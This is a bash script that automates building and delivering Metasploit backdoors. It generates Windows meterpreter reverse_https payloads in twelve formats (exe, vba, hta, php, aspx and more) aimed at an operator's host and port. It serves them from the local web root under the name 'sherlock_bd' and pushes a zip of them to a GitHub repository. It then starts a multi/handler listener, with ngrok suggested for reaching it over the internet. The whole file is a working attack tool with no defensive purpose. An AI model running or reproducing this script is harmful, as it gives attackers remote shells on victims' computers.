#!/bin/bash
set_date='payloads'
upload_github() {
	set_date_up=$(date)
	zip_compress='payloads.zip' #modify
	user_name='sherlock7298' #modify
	repository='bd_sherly' #modify
	folder_compress="$set_date" #modify
	zip -r -9 "$zip_compress" "$folder_compress"
	git init
	git remote add origin https://github.com/$user_name/$repository.git
	git add "$zip_compress"
	git commit -m "Upload files: $set_date_up"
	git push -u -f origin master
}
if [[ -d $set_date ]]; then
	cd "$set_date"
	rm -r *
	cd ..
	rmdir "$set_date"
fi
if [[ -f 'payloads.zip' ]]; then
	rm "payloads.zip"
fi
set_date2=${set_date//' '/''}
set_date2=${set_date2//':'/''}
#types
types=('raw' 'cmd' 'vba' 'vbs' 'war' 'exe' 'java' 'js' 'php' 'hta' 'cfm' 'aspx')
#payload
payload='windows/meterpreter/reverse_https'
if [[ $1 == '--help' || $1 == '-h' ]]; then
echo "Usage: $0 'LPORT={PORT / Forwarded PORT}' 'LHOST={DNS / IP / VPS IP}'"
echo 'TYPES:'
for i in "${types[*]}"; do echo "$i"; done
else
	clear
	echo '----------------------------------------------------------------------------------------------------'
	echo "Please select the interface... (If using the 'lo' interface the attack is in no local network)"
	echo '----------------------------------------------------------------------------------------------------'
	echo 'Interface list:'
	echo '----------------------------------------------------------------------------------------------------'
	ip -o -4 addr list |awk '{print $2}' |cut -d / -f1
	echo '----------------------------------------------------------------------------------------------------'
	read -p '-> ' interface
	#lo interface
	if [[ $interface == 'lo' ]]; then
		localip=$(ip -o -4 addr list $interface |awk '{print $4}' |cut -d / -f1)
		localmac=$(ip link show $interface |awk '/loopback/ {print $2}')
		if [[ $2 == '' ]]; then
			echo 'No DNS usage!'
			exit
		fi
	#eth interface
	elif [[ $interface == eth* ]]; then
		localip=$(ip -o -4 addr list $interface |awk '{print $4}' |cut -d / -f1)
		localmac=$(ip link show $interface |awk '/ether/ {print $2}')
	#wlan interface
	elif [[ $interface == wlan* ]]; then
		localip=$(ip -o -4 addr list $interface |awk '{print $4}' |cut -d / -f1)
		localmac=$(ip link show $interface |awk '/ether/ {print $2}')

	else
		echo "The interface '$interface' is not supported, sorry!"
		exit
	fi
	if [[ $1 == '' ]]; then
		localport=4444
	else
		localport=$1
	fi
	if [[ $2 == '' || $interface == wlan* || $interface == eth* ]]; then
		internet_host=$localip
	else
		internet_host=$2
	fi
	#intertet services
	service apache2 restart
	service postgresql restart
	clear
	if [[ $interface == 'lo' ]]; then
		echo '----------------------------------------------------------------------------------------------------'
		echo 'Current interface can use on internet explotation, u should configure ngrok or similar...'
		localport=443
		echo "Use port $localport to connect from internet './ngrok tcp $localport'"
		echo '----------------------------------------------------------------------------------------------------'
	fi
	#configure rc file
	if [[ -f msf_conf_pc.rc ]]; then
		rm msf_conf_pc.rc
		sleep 2
		echo "use exploit/multi/handler">>msf_conf_pc.rc
		echo "set payload $payload">>msf_conf_pc.rc
		echo "set lhost $localip">>msf_conf_pc.rc
		echo "set lport $localport">>msf_conf_pc.rc
		echo "set ExitOnSession false">>msf_conf_pc.rc
		echo "exploit -j -z">>msf_conf_pc.rc
	else
		echo "use exploit/multi/handler">>msf_conf_pc.rc
		echo "set payload $payload">>msf_conf_pc.rc
		echo "set lhost $localip">>msf_conf_pc.rc
		echo "set lport $localport">>msf_conf_pc.rc
		echo "set ExitOnSession false">>msf_conf_pc.rc
		echo "exploit -j -z">>msf_conf_pc.rc
	fi
	echo '----------------------------------------------------------------------------------------------------'
	echo "Current IP: $localip"
	echo "Current MAC Address: $localmac"
	echo "Current Port: $localport"
	echo "Started at "$(date)
	echo '----------------------------------------------------------------------------------------------------'	
	set_date=${set_date//' '/''}
	set_date=${set_date//':'/''}
	name_payload="no-name-$set_date"
	if [[ $1 == '' ]]; then
		localport=4444
	else
		localport=$1
	fi
	echo 'Do u need generate payloads with this configuration? (lower case)'
	read -p '->> (yes or not) ' payloads_gen
	echo $payloads_gen
	while [[ $payloads_gen != 'yes' && $payloads_gen != 'not' ]]
	do
		read -p '->> (yes or not) ' payloads_gen
		echo $payloads_gen
	done
	echo '----------------------------------------------------------------------------------------------------'
	if [[ $payloads_gen == 'yes' ]]; then
		echo 'Only exe file? (lower case)'
		read -p '->> (yes or not) ' only_exe
		echo $only_exe
		while [[ $only_exe != 'yes' && $only_exe != 'not' ]]
		do
			read -p '->> (yes or not) ' only_exe
			echo $only_exe
		done
		#generate payloads
		if [[ $only_exe == 'yes' ]]; then
			mkdir "$set_date"
			echo '----------------------------------------------------------------------------------------------------'
			echo 'Writing the payloads to use...'
			echo "Set Values --> [host=$internet_host port=$localport payload=$payload type=$k]"
			./ps1encode.rb -i $internet_host -p $localport -a $payload -t exe
				if [[ -d "/var/www/html/exe/" ]]; then
					echo 'Directory...Exist!'
				else
					mkdir "/var/www/html/exe/"
					echo 'Directory...Created!'
				fi
				if [[ -f "/var/www/html/exe/sherlock_bd.exe" ]]; then
					rm "/var/www/html/exe/sherlock_bd.exe"
				fi
				if [[ -f "/var/www/html/exe/_f_sherlock_bd.exe" ]]; then
					rm "/var/www/html/exe/_f_sherlock_bd.exe"
				fi
				mv "final_.exe" "$name_payload.exe"
				cp "$name_payload.exe" "/var/www/html/exe/sherlock_bd.exe"
				mv "$name_payload.exe" "$set_date/$name_payload.exe"
			upload_github
		else
			mkdir "$set_date"
			echo '----------------------------------------------------------------------------------------------------'
			echo 'Writing the payloads to use...'
			for k in "${types[@]}"
			do
				echo "Set Values --> [host=$internet_host port=$localport payload=$payload type=$k]"
				./ps1encode.rb -i $internet_host -p $localport -a $payload -t $k>>d_final_.$k
				if [[ -d "/var/www/html/$k/" ]]; then
					echo 'Directory...Exist!'
				else
					mkdir "/var/www/html/$k/"
					echo 'Directory...Created!'
				fi
				if [[ -f "/var/www/html/$k/sherlock_bd.$k" ]]; then
					rm "/var/www/html/$k/sherlock_bd.$k"
				fi
				if [[ -f "/var/www/html/$k/_d_sherlock_bd.$k" ]]; then
					rm "/var/www/html/$k/_d_sherlock_bd.$k"
				fi
				if [[ -f "final_.$k" ]]; then
					mv "final_.$k" "$name_payload.$k"
					cp "$name_payload.$k" "/var/www/html/$k/sherlock_bd.$k"
					mv "$name_payload.$k" "$set_date/$name_payload.$k"
					rm "d_final_.$k"
				else
					mv "d_final_.$k" "$name_payload.$k"
					cp "$name_payload.$k" "/var/www/html/$k/sherlock_bd.$k"
					mv "$name_payload.$k" "$set_date/$name_payload.$k"
				fi
			done
			upload_github
		fi
	fi
	#start metasploit
	msfconsole -q -r msf_conf_pc.rc
	if [[ -f msf_conf_pc.rc ]]; then
		rm msf_conf_pc.rc
		rm sample.war
	fi
	clear
fi
